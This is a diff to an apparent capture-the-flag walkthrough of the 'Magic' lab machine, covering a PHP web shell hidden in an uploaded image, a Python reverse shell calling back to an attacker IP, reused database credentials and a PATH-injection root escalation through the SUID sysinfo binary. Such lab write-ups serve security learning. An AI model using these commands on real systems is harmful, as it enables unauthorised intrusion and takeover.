@@ -67,4 +67,66 @@ exiftool -Comment='<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_RE
 
 Once I uploaded, I used BURP to intercept the image file, and sent to repeater. Once in repeater, I changed the filename to index.php.jpeg and sent the POST forward:
 
-,center><img src="/images/posts/magic_walkthrough/burp_repeater.png" alt="burp_repeater"></center>
+<img src="/images/posts/magic_walkthrough/burp_repeater.png" alt="burp_repeater">
+
+Once the malicious image was uploaded, I went back to the home page that was full of images, and I found that images were uploaded to `/images/uploads`. With this, I went to my image at `10.10.10.186/images/uploads/index.php.jpeg` and could then run commands:
+
+
+{% highlight bash linenos %}
+http://10.10.10.185/images/uploads/index.php.jpeg?cmd=ls
+{% endhighlight %}
+
+Then, I got to work on a reverse shell! There were many shells that would not connect back. Eventually, I found python3 in `/usr/bin` and used a python reverse shell using my web shell:
+
+{% highlight bash linenos %}
+/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.64",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+http://10.10.10.185/images/uploads/index.php.jpeg?cmd=ls
+{% endhighlight %}
+
+And I got a reverse shell back:
+
+<img src="/images/posts/magic_walkthrough/shell.png" alt="shell">
+
+I then began enumerating the `/var/www/Magic directory`, working my way down. Eventually I came across a `bk.sql` file, that had hardcoded credentials:
+
+<img src="/images/posts/magic_walkthrough/bk-sql.png" alt="bk-sql">
+
+It did not work for root, but there is another user on the system, `theseus`. I was able to log right in as that user:
+
+<img src="/images/posts/magic_walkthrough/theseus.png" alt="theseus">
+
+And I owned user:
+
+{% highlight bash linenos %}
+cat /home/theseus/user.txt
+xxxxxxxxxxxxxxxxxxxxff70c41c8b037eaab
+{% endhighlight %}
+
+While enumerating for root, I found that the `sysinfo` binary had SUID set:
+
+{% highlight bash linenos %}
+find / -perm -u=s -type f 2>/dev/null
+...
+/bin/sysinfo
+...
+{% endhighlight %}
+
+Looking on the internet, there are a lot of MagniComp vulnerabilities that appeared for this binary. Ultimately, this was a combination of two attacks to get root. First, was a PATH injection. I had to set a path, in this case `/tmp`, into the `$PATH` variable for a malicious binary to run:
+
+
+<img src="/images/posts/magic_walkthrough/path-injection.png" alt="path-injection">
+
+And now that we have our path set, let's make the malicious binary. When sysinfo runs, it calls lshw to look at the hardware on the system. Make a malicious lshw file:
+
+{% highlight bash linenos %}
+echo "/bin/cat /root/root.txt" > lshw
+chmod 777 lshw
+{% endhighlight %}
+
+And then once sysinfo is run, you will have root!
+
+
+{% highlight bash linenos %}
+cat /root/root.txt
+xxxxxxxxxxxxxxxxxx051a7763c65c29a26f4
+{% endhighlight %}
